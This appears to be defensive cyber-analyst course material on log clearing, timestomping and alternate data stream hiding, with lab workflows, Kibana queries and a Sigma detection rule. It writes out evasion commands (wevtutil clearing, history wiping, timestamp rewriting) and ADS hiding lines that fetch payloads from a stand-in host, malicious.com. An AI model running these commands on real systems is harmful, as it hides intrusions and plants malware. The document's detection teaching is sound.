Log clearing, the act of removing specific log entries or the complete history of events, allows adversaries to remain undetected or delay detection. Initial access warnings may make it to a log server, and then events from the host may suddenly stop or appear deliberately altered. If logs begin disappearing from the host, proper alerts configured in an organization’s security suite should detect the absence of logs. Sometimes, however, the delay in detection is all an adversary needs to exfiltrate data or cause permanent harm. Understanding the methodology of log clearing can help in understanding adversary activity.

﻿

MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) Identifier (ID) T1070.001 provides information about the wevtutil system tool, which can also clear Windows system logs. The wevtutil cl command can be used to remove system, applications and services, and security logs on a host, and the tool’s unauthorized use should immediately be investigated. Other tools have been created specifically for clearing Windows logs, namely, clearlogs.exe and Meterpreter’s clearev command. These tools are commonly used from penetration devices like Kali.  

﻿

Clearing logs in Linux depends on the specific Operating System (OS) for the exact file path. Linux logs are stored in the /var/log directory. Eradicating these logs is performed using the command cat dev/null > (Log file path). To clear or alter select logs, logs must be identified and edited with a text editor, such as Vi. Another tool for log eradication is Shred, which provides a more thorough method to eradicate Linux logs by shredding all the contents into unreadable formats. A final step in clearing Linux logs is to clear or unset the history of the shell. The shred or cat commands can be used to erase the shell history file. In an active session, the history file can also be unset with the unset command. This prevents the current session from writing to the history file on exit. If the shell history is not cleared, a series of commands remains that can be used to identify malicious activity and show the actions of log clearing.

﻿

Detecting log-clearing methods involves detecting the act of the clearing itself. Windows Security Log Event ID 1102 is the event log for an “Audit Log Was Cleared” event. In the system log, Event ID 104 is the event log for a log clear event. It specifies which log was cleared in the message. If an adversary is using a built-in tool like AuditPol or a malicious script, they may miss these events, which would show their attempt. As mentioned above, large amounts of time without logs should be investigated and should not be assumed to be a system error. Additionally, if logs exist that do not contain proper information or that seem to have misspellings and placeholder text, those logs may have been manipulated by an adversary. Last, if the timestamps on logs are out of order, that could indicate an adversary attempting to inject fake timestamps into the logs to mask their persistence.

﻿

Other methods of detection require more in-depth examination of log-related elements on the system. If logs have been cleared, log counts and events can always be cross-referenced from a Security Information and Event Manager (SIEM) or log server. Centralized logging in these locations allows for an additional source of those logs to be replicated. Also, attacks against centralized logging are more difficult to execute, creating a more secure source of logs for security personnel. If there are odd system processes tied to logs or timestamps for the creation of a log that do not match what is listed in a log, these can all be Indicators of Compromise (IOC). Vigilant alerts and understanding of what an organization logs are paramount to detecting these masking techniques. As shown in Figure 20.1-1, cross-referencing logs to a SIEM allows analysts to identify changes and modifications of timestamps on the host.

![image](https://github.com/user-attachments/assets/0959d38f-6116-44e6-8ef5-80219a507071)

Stopping Log Auditing


Another activity associated with log clearing is preventing logs at the source. Stopping event logging is not considered log clearing and generates an alert in security monitoring tools when a device stops sending logging information. Therefore, the act of disabling log auditing is easily detected by most security monitoring tools.


Once an adversary gains access to a system, many OS tools allow them to disable all logging and gain information on how much logging the target system performs. In Windows environments, the system tool AuditPol is an Audit Policy manager that normally allows system administrators to read and edit the Windows syslog settings on a host. With the correct level of access, an adversary could disable logging entirely and no new logs would appear in Windows Event Viewer. Additionally, a log forwarder that is present on the system can be disabled by either blocking the forwarding at the network level or removing the log forwarder configuration. These steps depend on the specific log forwarding implementation, but SIEM tools alert if a device is not forwarding logs as configured.


Linux logging is more specific to both the distribution- and application-level logging that an administrator may need. Most distributions use syslog to log events on the OS, and many applications forward their logs to the syslog service. An adversary could block read/write access to /var/log/syslog on Debian-based systems or /var/log/messages on Fedora, corrupt the syslog service, or block the syslog forwarding so that the logs never leave the system. The adversary could then perform many actions on their infected target without their presence being reported.
![image](https://github.com/user-attachments/assets/560fcb12-c72f-42b1-aa46-aceb99838005)

-------------

Analyze the Tradecraft of Adversarial Log Clearing in Windows
In the following exercise, perform a few basic methods of clearing logs on a Windows system, and view in Event Viewer when adversaries attempt to cover their tracks.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the command prompt with administrator privileges.

﻿

3. Clear the event log to remove all logging history with the following three commands:

> wevtutil cl system
> wevtutil cl application
> wevtutil cl security
﻿

4. Open Event Viewer.

﻿

5. Navigate to Windows Logs > Security.

﻿

6. A single log entry appears. 

﻿

The Task Category says “Log clear,” denoting that the security logs were cleared. Adversaries often script commands like wevtutil to remove logs as they create events, but this event is not cleared and can be set as a trigger for forwarding software (if used) to detect it.

﻿

PowerShell can also be used to clear the event logs. Adversary tools often take advantage of native Windows processes, like PowerShell, to perform their actions. 

﻿

7. Close Event Viewer, and run PowerShell as an administrator.

﻿

8. Clear the event logs by entering the following command:

Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
﻿

9. Reopen Event Viewer.

﻿

10. Navigate to Windows Logs > System.

﻿

Both PowerShell and Command Prompt display that the event log was cleared. Windows is built to create an event for clearing the logs, no matter the source. Without specialized tools for editing or corrupting the specific .evtx files, Windows leaves a trace of log-clearing activities for defenders to identify. If any .evtx files are corrupted, this may also provide an indicator of log-clearing activities.

![image](https://github.com/user-attachments/assets/bea4887c-f193-47c5-9ecf-0fce9ab76a55)

![image](https://github.com/user-attachments/assets/8921c998-8c5e-4104-9da3-edf6b74ca644)

----------------

Analyze the Tradecraft of Adversarial Log Clearing in Linux
In the following exercise, evaluate Linux log-clearing methods to understand the criticality of the history file of the shell. Viewing logs and performing clearing actions illustrate the potential activities of adversaries.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal window.

﻿

3. Run the following command to view syslog files on the system:

sudo cat /var/log/syslog
﻿

4. Run the following command to edit the logs in the syslog file:

sudo vi /var/log/syslog
﻿

5. Scroll down to the bottom of the syslog file by holding the PageDown key until Bot appears on the screen. Select the Delete (Del) key to erase the final entry of the syslog. 

﻿

NOTE: A warning about the file changing while it is open for editing may appear. Such a message may be ignored.

﻿

6. Input the following command, and enter to save changes:

:wq 
﻿

7. Run the following command to view the shell history:

history
﻿

The history shows all the commands entered in the history file. The commands entered in steps 3 and 4 above are shown in the history; they were used to erase logs in the syslog file. The history shows a clear indicator of log clearing. 

﻿

8. Run the following command to stop the current session from being stored in the history:

unset HISTFILE
﻿

9. Enter the following command to delete the contents of the history file:

cat /dev/null > ~/.bash_history
﻿

10. Close the terminal to end the current session.

﻿

11. Open a new terminal window.

﻿

12. Enter the following command to view the current Bash history:

history
﻿

The new terminal shows that the command history was run. This illustrates the steps needed to mask one’s presence when performing log clearing. All the commands run within the shell are tracked, but the unset command is a powerful tool used by attackers to avoid detection. Attackers can hide their actions and set about clearing all logs that may have alerted to a trace of their access. Although these commands are not the only methods for adversaries to avoid or edit logs of their activities, monitoring their use and generating alerts within such defensive security tools as a SIEM can still provide valuable information. 


![image](https://github.com/user-attachments/assets/ebea6f13-3384-4bb4-b204-63e57c075b1e)


------------


### CDAH-M20L2-Timestomping ###


What Is Timestomping?
Timestomping is the act of changing the timestamps assigned to a file. When a computer that houses hundreds of files is attacked, the first thing examined is the time of the attack. If no filenames are known or no files can be found that match that time, forensic investigations are more difficult and the full picture of what actions occurred on the system is more difficult to determine.

﻿

Purpose of Timestomping
﻿

Attackers perform timestomping to make detection of their activities more difficult, causing forensic investigations to consume more time and potentially allowing for the malware to stay hidden. Attackers commonly add malicious binaries to a system they are focused on compromising so that they can steal information, gain persistent access, or spread to other systems in the network. The longer a malicious file can stay on disk undetected, the longer the attacker can maintain access to the system. 

﻿

Timestomping a malicious binary can make locating malware on a host with no antivirus signature and with a mismatch between the timestamp and detected malicious activity seem like finding a needle in a haystack. An example of timestomping is to place a malicious file in the folder C:\Windows\System32, which already has thousands of files, and then to match the date of the file to others already present. Even if a defender goes to that directory and sorts it by date, the malicious file does not appear at the top of the list as the most recently added file. 

﻿

Commonly, an attacker selects an executable (.exe) file or a Dynamic Link Library (.dll) file that is already present in the system under attack and names the malicious file similarly. For example, if a file named googlemaps.dll is present in the folder, the attacker may create a binary called googlemaps.exe to make the two files appear to be associated and use the timestamp of the .dll file to make the malicious file look legitimate.

﻿

Timestomping can be performed on both Windows and Linux systems. 

﻿

Windows Timestamps
﻿

Windows has two attributes in the New Technology File System (NTFS) for tracking:  $STANDARD_INFORMATION and $FILE_NAME.

﻿

Common fields of the $STANDARD_INFORMATION attribute are as follows:

File creation time

File modification time

Master File Table (MFT) modification time

File access time

Flag values (such as hidden, read-only, archive, system)

Owner Identifier (ID)

Security ID


Common fields of the $FILE_NAME attribute are as follows:

File creation time

File modification time

MFT modification time

File access time

Allocated size of file

Real size of file

Length of name

Name


The $STANDARD_INFORMATION and $FILE_NAME attributes differ in how they may be modified and whether their related timestamps can be changed. Whereas $STANDARD_INFORMATION can be altered by user-level processes and related timestamps can be overwritten by timestomping, $FILE_NAME can be modified only by the system kernel and related timestamps cannot be overwritten by timestomping.

﻿

$STANDARD_INFORMATION and $FILE_NAME use the same timestamps, commonly referred to as MACB timestamps:

Modified (M): The most recent time the file was edited.

Accessed (A): The most recent time the file was opened.

Changed (C): The most recent time the file metadata (for example, the permissions or filename) was changed.

Birth (B): The date the file was first written to disk.

﻿Figure 20.2-1 provides an illustration, for $STANDARD_INFORMATION and $FILE_NAME, of what happens to corresponding MACB timestamps when different actions (renaming, copying, and modifying) occur with files. Many actions can change the timestamp of a file, and having availability to such resources as this illustration helps when determining if a file change was legitimate or malicious. 

﻿

NOTE: An internet search for time rules provides more rules about file actions and relative timestamps than Figure 20.2-1 offers.

﻿
![image](https://github.com/user-attachments/assets/c32dd172-e91c-4020-b1a7-0690dab84464)


Figure 20.2-2 shows an example of a Windows Explorer Properties window that includes timestamps:


![image](https://github.com/user-attachments/assets/0447870b-fb71-4fda-b975-c0c0e5a511d7)



Linux Timestamps


As with Windows, Linux includes four timestamps:
Modify time (m): The most recent time that the file was edited.
Access time (a): The most recent time that the file was accessed or opened or that the directory containing the file was opened.
Change time (c): The time that the file’s metadata (for example, the permissions or filename), not its contents, was changed.
Creation time (cr): The date that the file was first written to disk.


The creation time (cr) timestamp is available only on ext4 file systems, whereas ext3 supports modify (m), access (a), and change (c) timestamps. Accessing timestamps and understanding their terminology may vary across different ext file system versions.


Three commands (ls, stat, and debugfs) can be used to view Linux timestamps. The ls command shows only the most recently modified timestamp, stat shows MAC timestamps but not the creation timestamp, and debugfs shows all dates but requires the inode number from the stat command. Figures 20.2-3 through 20.2-6 show the differences between the commands.


![image](https://github.com/user-attachments/assets/140178f3-044b-449b-97e7-6d2375cc10df)

![image](https://github.com/user-attachments/assets/843ddf3b-85d8-48c9-aecc-24fb16967b97)

![image](https://github.com/user-attachments/assets/c24faee2-03d7-45c2-9431-3b0fc5e13ee1)

![image](https://github.com/user-attachments/assets/4ae975e9-027c-4cb5-8a79-a4c65188ca0c)


--------------


Timestomping Tools
Windows Tools
﻿

Attackers have a variety of tools at their disposal to perform timestomping in Windows systems, such as the following:

PowerShell

TimeStomper

SKTimeStamp

Timestomp


PowerShell
﻿

PowerShell is an open-source, cross-platform solution for task automation. A Microsoft program, PowerShell consists of a command-line shell, scripting language, and configuration management framework. 

﻿

Examples of PowerShell use to perform timestomping in Windows are as follows:

﻿

The following command changes the creation time of a folder named myfolder1:

PS C:\mytest> (Get-Item "C:\mytest\myfolder1").CreationTime=("08 March 2016 18:00:00")
﻿

The following command changes the modification time of a file named myfile1.txt:

PS C:\mytest> (Get-Item "C:\mytest\myfile1.txt").LastWriteTime=("12 December 2016 14:00:00")
﻿

The following command changes the access time of a file named myfile2.txt:

PS C:\mytest> (Get-Item "C:\mytest\myfile2.txt").LastAccessTime=("10 December 2015 14:00:00")
﻿

TimeStomper
﻿

TimeStomper is a proof-of-concept that manipulates Windows file times.

﻿

An example of TimeStomper to perform timestomping in Windows is as follows:

PS C:\Users\John\source\repos\TimeStomper\Release> .\TimeStomper.exe -p2 C:\temp\tuesday.txt -p C:\temp -r


![image](https://github.com/user-attachments/assets/d5f48066-befb-4e92-9bf2-fe360d59fd30)



Using the options below, the TimeStomper command modifies the timestamp of tuesday.txt and applies it recursively to all subfolders and files within C:\temp:
-p2: Specifies the file from which the timestamp is copied.
-p C:\temp: Specifies where the timestamp will be applied.
-r: Indicates that the command should apply the timestamp changes recursively.

SKTimeStamp


SKTimeStamp is a shell extension that adds a new tab to the Windows Explorer Properties window, as shown in Figure 20.2-8. An attacker can change the creation, modification, or access date/time of a file or folder in the new tab.


![image](https://github.com/user-attachments/assets/482dc6ad-fd2a-40a9-ad98-2250e88851a5)

Timestomp


Timestomp is a post-exploitation module in Metasploit’s Meterpreter that is used to timestomp files.


Figure 20.2-9 shows the syntax for Timestomp:

![image](https://github.com/user-attachments/assets/ca63a31a-1838-4ff5-9e7b-1af632bc4262)

As an example of how Timestomp is used, consider a file example.txt. Figure 20.2-10 indicates the times for the file example.txt before timestomping occurred:


![image](https://github.com/user-attachments/assets/fed73e2c-6479-45cb-9759-f0cfffdf2a3f)


Figure 20.2-11 shows the command to change the modification date and time of example.txt:

![image](https://github.com/user-attachments/assets/f499da2b-bfb1-40df-8f37-38c6bb495d3c)

Figure 20.2-12 shows the results of timestomping of the modification date and time:


![image](https://github.com/user-attachments/assets/bc40f72c-b097-4e2c-873e-93914f34e896)


Linux Tool


The main tool for timestomping files on a Linux host is the built-in touch command.


Figure 20.2-13 shows the syntax for the touch command:



![image](https://github.com/user-attachments/assets/d9ff9b87-0642-493b-87af-8a517645f8b7)


Figure 20.2-14 provides an example of timestomping using the touch command. The upper portion of the figure shows the access, modify, and change dates and times. The middle area shows application of the touch command to change the timestamps. The bottom portion of the figure shows the results of the timestomping. 


![image](https://github.com/user-attachments/assets/17984c87-3af2-4de0-906f-b1dc33ed515b)


--------------------


Detecting Timestomping
On a Windows system, timestomping can be detected during a forensic examination by analyzing the MFT. As stated earlier, $STANDARD_INFORMATION timestamps can be overwritten by timestomping, but $FILE_NAME timestamps cannot. If a $STANDARD_INFORMATION timestamp is a few nanoseconds earlier than a corresponding $FILE_NAME timestamp, timestomping likely occurred against the file of interest. A tool such as analyzeMFT.py can extract the contents of the MFT (where $STANDARD_INFORMATION is stored) and compare the times with the $FILE_NAME timestamps (what the Operating System [OS] shows as the MACB values).

﻿

Another option is to review $UsnJrnl or $Logfile, two additional artifacts used by NTFS.

﻿

$UsnJrnl

﻿

$UsnJrnl ($J) is a data stream/metadata used by NTFS to store records of file system operations. $UsnJrnl primarily allows backup applications visibility into the files that have been changed since the last time a backup was run. Therefore, $UsnJrnl keeps track of all modify, access, and creation times of files. A data stream is not a physical file on the hard drive that can be browsed to view in File Explorer. Only forensic tools such as FTK® Imager have the ability to carve and view such streams from a whole disk image.

﻿

$Logfile

﻿

$Logfile is a data stream used by NTFS to record all metadata changes of a file system in case of a system crash. It is an area stored within NTFS to keep multiple copies of information about files to ensure that information is never lost.

﻿

$UsnJrnl records such operations as File_Create, File_Delete, Rename_Old_Name, and Rename_New_Name, which contain the original dates of files and can be compared to the dates in the MFT that may have been modified. $UsnJrnl and $Logfile can be parsed by a tool called MFTECmd and then compared against the MACB values of a file.

﻿

An even simpler option, if Sysmon is running on a system and logs are being forwarded to Elastic, is to filter the logs for "*time changed*". This can quickly identify the timestomped files.

﻿

Detection of timestomping in a Linux system is much more difficult than on a Windows system. Timestomping in Linux can be detected when logging is forwarded to another system like Elastic or if an Endpoint Detection and Response (EDR) solution like CrowdStrike monitors for such activities as the use of the touch command.﻿

﻿![image](https://github.com/user-attachments/assets/602f22e1-31a1-488b-83e0-ec7708acc35a)

----------

Analyze Timestomp Activity
Consider the following scenario: An attacker has gained remote access to a machine and has dropped malware and is using it for persistent access. The file being used for persistence was timestomped.

﻿

In the following lab, identify the file that was timestomped, and discover the original time and the altered time. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome, and select the Discover - Elastic bookmark.

﻿

3. The warning Your connection is not private is displayed on the page. Select Advanced, and select Proceed to 199.63.64.92 (unsafe). 

﻿

4. Log in to Elastic using the following credentials:


Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Set the Kibana filter dates to Aug 18, 2022 @ 08:56:00.000 to Aug 18, 2022 @ 09:00:00.000

﻿![image](https://github.com/user-attachments/assets/9800a7cf-c043-4c95-a51a-98a4b33f05f6)


6. Query for the hostname of the device being analyzed to filter the logs:
agent.name:bp-wkstn-1



7. Search through Elastic to attempt to find the timestomped file. (Look through the options available under the event.action field.)


Figure 20.2-16 provides an example of Sysmon output showing the before and after timestamps (corresponding to winlog.event_data.PreviousCreationUtcTime and winlog.event_data.CreationUtcTime, respectively) from timestomping. Clearly, differences exist. Of particular note is that the winlog.event_data.PreviousCreationUtcTime timestamp ends in .000, corresponding to 0 nanoseconds (ns). When timestamps are set through tools, nanoseconds are not added and 000 is instead assigned. This is one indicator of timestomping.


![image](https://github.com/user-attachments/assets/ca6805b9-fc6a-44b2-a83d-0cc867823809)



What is available in Elastic may now be correlated with what is in the forensic image. 


8. Minimize the Chrome window, and open FTK Imager. 


User Access Control (UAC) appears, as this application is being run with administrative privileges. 


9. Select Yes to open FTK Imager.


10. Open the forensic image E:\bpwkstn1.001 in FTK Imager: 

![image](https://github.com/user-attachments/assets/983bf505-899b-427d-9a8d-096cf52ca558)


![image](https://github.com/user-attachments/assets/f8d52279-aa6f-45a7-b4e4-3563bbf9c01e)


11. Expand bpwkstn1.001 to Partition 2/NONAME [NTFS]/[root]/Windows/System32.


12. Investigate the timestomped file and the times displayed by FTK Imager. The times are available in the Properties window in the bottom left corner of the FTK Imager User Interface (UI).


NOTE: FTK Imager shows both the original time and timestomped time. Scrolling through the Properties window may be necessary.

![image](https://github.com/user-attachments/assets/05ebfc86-8611-4254-8255-605211c6b002)


Use the workflow above to answer the following questions.

![image](https://github.com/user-attachments/assets/6d3691a7-35ad-41eb-a95d-9bb7a2e6aaaf)

![image](https://github.com/user-attachments/assets/12c65fb1-b775-4c80-b5e3-9661fc8c147c)


![image](https://github.com/user-attachments/assets/7bb2ea3c-3d60-4660-b12a-a944a5e2caf1)


--------------


`### CDAH-M20L3-Alternate Data Stream Process Hiding ###


ADS Hiding Techniques
What Is an ADS?
﻿

In the NTFS file system, streams are sequences of bytes that contain the data that is written to a file. A file is a container containing two types of information: attributes that contain information about the file, such as the name, size, Media Access Control (MAC) times, and permissions, and any number of streams that contain the actual content of the file. However, streams beyond the default stream are invisible to most applications and User Interfaces (UI). Figure 20.3-1 illustrates the difference in structure between NTFS and the File Allocation Table (FAT) file systems.

﻿
![image](https://github.com/user-attachments/assets/b3ba7289-c35d-40e4-af85-d13a206edf3e)

File streams are accessed using the naming convention filename:StreamName. If desired, the stream type may be appended to the end (for example, filename:StreamName:$STREAMTYPE). The default file stream that is present for every file is the unnamed data stream, which is accessed by default when a file is opened, but it may also be accessed explicitly with the naming convention filename::$DATA.


Streams beyond the default stream are referred to as Alternate Data Streams (ADS). This feature of NTFS is rarely used to store meaningful content. Most files have either only the default stream containing the content of the file or a limited number of extra streams, such as the Zone.Identifier, which contains information about the origin of the file. For example, a file downloaded from the internet might have a Zone.Identifier stream containing the URL from which the file was downloaded. These streams are most commonly used to store metadata about the file that is more robust than the actual file attributes allow for. However, these streams are perfect for hiding malicious data in plain sight.


How Do Threat Actors Hide in an ADS?


Threat actors use native Windows binaries to write malicious data into the ADS of an otherwise innocuous file. This data can then be accessed and even executed by native Windows binaries. This evades many basic defensive techniques, such as signature-based detection and blocking execution of unknown binaries. Most signature-based security solutions run a hashing algorithm or a signature rule set against a whole file without separating out the data streams. Thus, using an ADS inherently masks the hash of the malicious file unless a security solution specifically scans individual data streams. Writing and executing these data streams using native binaries, sometimes referred to as “living off the land,” avoids security solutions that prevent or scrutinize execution of unknown binaries.


This process of hiding and executing malicious data in an ADS is described in the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework as Defense Evasion tactic, Hide Artifacts technique, NTFS File Attributes sub-technique T1564.004. 


Why Do Threat Actors Hide in an ADS?


When used by threat actors, an ADS allows a file to be hidden inside another file. This allows attackers to execute binary files that are not easily discovered on the file system. This can be performed with a number of native Windows binaries, some of which are surprising, as they are used in ways that are not immediately intuitive compared to their intended functionality. Analyzing the syntax for these common techniques is necessary to write effective alert signatures and to craft effective queries for extracting events from significant quantities of innocuous log data.


-----------


Common Binaries and Syntax for Hiding and Executing in an ADS
The following are common binaries and syntax for hiding and executing in an ADS.

﻿

certutil.exe﻿
﻿

Although typically used for handling certificates in Windows systems, the certutil tool may be employed by threat actors to download malicious files directly into an ADS. 

﻿

An example of a command using this tool is as follows:

certutil.exe -urlcache -split -f https://www.malicious.com/evilscript.ps1 c:\tempfile.doc:evil
﻿

cmd.exe﻿
﻿

As the default command-line interpreter for Windows, cmd.exe possesses inline utilities, such as echo, that enable writing to an ADS. When combined with a tool for downloading files, this can be used for malicious executable hiding. In the example below, regsvr32.exe is used to download a malicious file and stores it in an ADS called evil.bat within tempfile.doc:  

cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:www.malicious.com/RegSvr32.sct ^scrobj.dll > C:\tempfile.doc:evil.bat
﻿

control.exe﻿
﻿

Although control.exe is normally used to launch Control Panel items, it may also be used to execute a malicious Dynamic Link Library (DLL) hiding in an ADS. 

﻿

An example of a command using this tool is as follows:

control.exe c:\tempfile.txt:evil.dll
﻿

cscript.exe﻿
﻿

cscript.exe is the command-line version of the Windows Script Interpreter that may be used to execute Visual Basic (VB) scripts stored in an ADS.

﻿

An example of a command using this tool is as follows:

cscript c:\tempfile.txt:evil.vbs
﻿

esentutl.exe﻿
﻿

Designed for running tasks and operations related to databases and database files, this executable can abuse the NTFS file attribute ADS. Using different techniques, threat actors can hide files in these streams to accomplish different goals, such as tool infiltration and data exfiltration.

﻿

An example of a command using this tool is as follows:

esentutl.exe /y C:\evil.exe /d c:\tempfile.txt:evil.exe /o
﻿

However, when a malicious executable hiding in an ADS is identified, it may also be used to carve out the executable for further analysis with the following command syntax:

esentutl.exe /y C:\tempfile.txt:evil.exe /d c:\evil.exe /o
﻿

extrac32.exe	
﻿

This tool is built into Windows to extract Cabinet (CAB) files. If an attacker can compress a payload into this format, then extrac32.exe may be used to extract it and hide it in an ADS in one step.

﻿

An example of a command using this tool is as follows:

extrac32 C:\evil.cab c:\tempfile.txt:evil.exe
﻿

findstr.exe	
﻿

findstr is normally used to locate string patterns in files or filenames on a system, but part of its functionality may be abused by attackers to hide malware in an ADS by intentionally searching the malicious file for a string that does not exist and writing the portion of the file in which the string is not found (i.e., all of it) to the target ADS location. The /V flag prints only lines where the string is not present, and the /L flag interprets the string literally, as opposed to a regular expression.

﻿

An example of a command using this tool is as follows:

findstr /V /L DOESNOTEXIST c:\evil.exe > c:\tempfile.txt:evil.exe
﻿

forfiles.exe﻿
﻿

This utility is normally used to perform batch processing of a command on a file or set of files, but it may be repurposed by an attacker to execute a binary from an ADS as long as the file being searched for is valid.

﻿

An example of a command using this tool is as follows:

forfiles /p c:\windows\system32 /m notepad.exe /c "c:\tempfile.txt:evil.exe"
﻿

MpCmdRun.exe	
﻿

This utility is normally employed as a command-line administration tool for Windows Defender, but it may be employed to download files directly into an ADS.

﻿

An example of a command using this tool is as follows:

MpCmdRun.exe -DownloadFile -url https://www.malicious.com/evil.exe -path c:\\tempfile.txt:evil.exe
﻿

mshta.exe	
﻿

This utility is built into Windows to execute Hypertext Markup Language (HTML) code and is frequently used by attackers to trigger malicious HTML Application (HTA) payloads, which may contain embedded JavaScript (JS), JScript, or Visual Basic Script (VBScript).

﻿

An example of a command using this tool is as follows:

mshta.exe "C:\tempfile.txt:evil.hta"
﻿

powershell.exe﻿
﻿

Using the Set-Content cmdlet, data may be written directly to an ADS with the PowerShell terminal. In the following command, Set-Content is used to create an ADS called evil.ps1 within the tempfile.txt file and adds the contents of the -Value flag to that ADS.

﻿

An example of a command using this tool is as follows:

Set-Content -Path "C:\tempfile.txt" -Stream evil.ps1 -Value "Script Contents Here"
﻿

print.exe	
﻿

Although normally this binary is used by Windows to send files to a printer, it can be repurposed to hide files in an ADS. The /D flag is normally used to identify the printer to which a file is sent.

﻿

An example of a command using this tool is as follows:

print /D:C:\tempfile.txt:evil.exe C:\evil.exe
﻿

rundll32.exe	
﻿

This binary is used to execute DLL files for a variety of purposes during normal system operations. An attacker who has stored a malicious DLL in an ADS may also execute it with this utility.

﻿

An example of a command using this tool is as follows:

rundll32 "C:\tempfile.txt:evil.dll",DllMain
﻿

sc.exe	
﻿

If a Windows service-compatible executable is stored in an ADS and the user has the permissions to create new services, sc.exe may use the target in an ADS as the target for the service by entering the following commands:

sc create evilservice binPath="\"c:\\tempfile.txt:evil.exe\"" DisplayName= "evilservice" start= auto 

sc start evilservice
﻿

wmic.exe	
﻿

Used for a variety of management tasks by Windows administrators, wmic.exe may also be used by attackers to execute malicious binaries in an ADS with the following syntax:


wmic.exe process call create "c:\ads\file.txt:program.exe"
﻿

wscript.exe﻿
﻿

This is the User Interface (UI) version of the Windows Script Interpreter that may be used to execute VB scripts stored in an ADS. Despite being considered the UI version, it can still be run from the command line without opening a window that would alert a user. Syntax within the script may also be used to download files into an ADS, which is why it is ideal for multi-staged payloads that hide in an ADS. Files are downloaded with the following script syntax:

echo GetObject("script:https://www.malicious.com/evil.vbs") > C:\tempfile.txt:evil.vbs

wscript c:\tempfile.txt:evil.vbs

--------------

ADS Hiding Detection Techniques
The ATT&CK framework includes three major recommendations for detecting the use of an ADS for defense evasion:


Command execution, by examining system logs.

File metadata, which may be examined with forensic tools or system monitors.

Process calls metadata, which may be examined with forensic tools or system monitors.

Indications in System Logs
﻿

Indications of malware hiding in an ADS may be caught in native Windows event logs or Sysmon events, either when the actor modifies a file to add an ADS to it or when the malicious process executes from an ADS. There are several logs of interest in each case:

Windows Security Event Identifier (ID) 4656: A handle to an object was requested.

Sysmon Event ID 1: Process creation.

Sysmon Event ID 15: File stream creation.

Windows Security Event ID 4656
﻿

It is expensive for log storage space and analysis overhead to enable object auditing for all files in a file system. However, when the appropriate capabilities are in place to store or filter such logs, object access events are ideal points at which to detect adversary activity in creating or modifying an ADS for malicious purposes. The fields of interest are as follows:

ObjectName: Contains the name of both the base file and the stream that is being accessed

HandleID: The handle to the file stream itself. This handle may be cross-referenced with other logs, if necessary.

﻿![image](https://github.com/user-attachments/assets/28dc3a23-129b-49a4-9784-3049f9bc5710)

In Figure 20.3-2, the Object Name would also list a data stream if one were specifically requested. The Handle ID would be consistent across related logs, such as logs with an ID of 4663, which contain additional information about the activities performed by the executed application.


When audited, these events may be filtered with the following Kibana query:
event.module:"windows_eventlog" and event.code:4656



Sysmon Event ID 1


The Sysmon Process Creation event, illustrated in Figure 20.3-3, may be monitored to identify command execution that either hides malicious data in an ADS or executes from an ADS. The notable fields to examine are the following:

Image: This is the full path to the executable file that was the entry point for the process creation.
CommandLine: This is the full command executed. Because an ADS is not executed natively, this line is of particular interest to an investigator.
User: If the activity in question is confirmed as malicious, this account is the starting point for an incident response, as its context was compromised for adversary activity.
Computer: If the activity is malicious, this computer system is the other starting point for an investigation.


![image](https://github.com/user-attachments/assets/643b2154-4bb8-440b-8d2d-23347f2171d6)


When searching for ADS hiding, refer to the syntax listed in the previous section as a guide for constructing queries or alerts. Filtering logs by the commonly used native Windows binaries and indicative command-line flags can reduce the analytical task from thousands of logs. For example, if the binary esentutl.exe were employed by a threat actor to hide malware, the following query may find the event created by its execution:
event.module:"sysmon" and event.code:1 and process.image:*esentutl.exe and process.commandline:*/y* and process.commandline:*/d* and process.commandline:*/o



The actual creation of file streams is identified by analyzing Sysmon ID 15 events, but ID 1 events are still valuable sources of information after the specific tool is identified.


When searching for the execution of payloads hidden in an ADS, employ a similar technique with binaries known to be able to execute them. Additionally, filtering for the command-line signature of an ADS stream file.extension:stream in a process creation event yields leads to be investigated that may employ techniques of which an analyst is not aware. The following query holds to that pattern:
event.module:"sysmon" and event.code:1 and process.command_line :*.*\:*



Sysmon Event ID 15


The Sysmon Create File Stream event, illustrated in Figure 20.3-4, logs the creation of Zone.Identifier unless that stream name is filtered out in the Sysmon configuration file. Because this stream is created with almost every file, it is advisable to filter it out to reduce the number of logs that need to be ingested. The most important fields in this event type are the following:
Image: This is the name of the executable creating the file stream.
TargetFileName: This is the file in which the stream is created, which contains the stream name.
Hash: This contains hashes of the data in the file stream, if configured.
User: If the activity is malicious, this user account is likely compromised.
Computer: If the activity is malicious, this computer is likely compromised.

![image](https://github.com/user-attachments/assets/5d800ca7-ab78-4006-aba4-0d7fe8323747)


Although these events are not helpful for identifying the execution of payloads in an ADS, they are quite handy for finding the initial hiding of a payload. The following type of Kibana query gathers all events in which an ADS stream is created:
event.module:"sysmon" and event.code:15



If Zone.Identifier streams are logged with Sysmon, filtering those out with the following syntax is useful:
and not file.target:*Zone.Identifier 



A more advanced logging option is to turn on hashing of the Import Address Table (IAT) of data placed in ADS for Sysmon Event ID 15 logging. When such hashing is configured, the following Sigma rule may be used to configure alerts indicating that an executable file is placed in an ADS because non-executable files that do not have an IAT produce a zero Import Hash (IMPHASH) value:

title: Executable in ADS
id: b69888d4-380c-45ce-9cf9-d9ce46e67821
status: test
description: Detects the creation of an ADS data stream that contains an executable (non-empty imphash)
author: Florian Roth, @0xrawsec
references:
  - https://twitter.com/0xrawsec/status/1002478725605273600?s=21
date: 2018/06/03
modified: 2021/12/08
logsource:
  product: windows
  category: create_stream_hash
  definition: 'Requirements: Sysmon config with Imphash logging activated'
detection:
  selection:
    Hashes|contains: 'IMPHASH='
  filter:
    Hashes|contains: 'IMPHASH=00000000000000000000000000000000'
  condition: selection and not filter
fields:
  - TargetFilename
  - Image
falsepositives:
  - unknown
level: critical
tags:
  - attack.defense_evasion
  - attack.s0139
  - attack.t1564.004



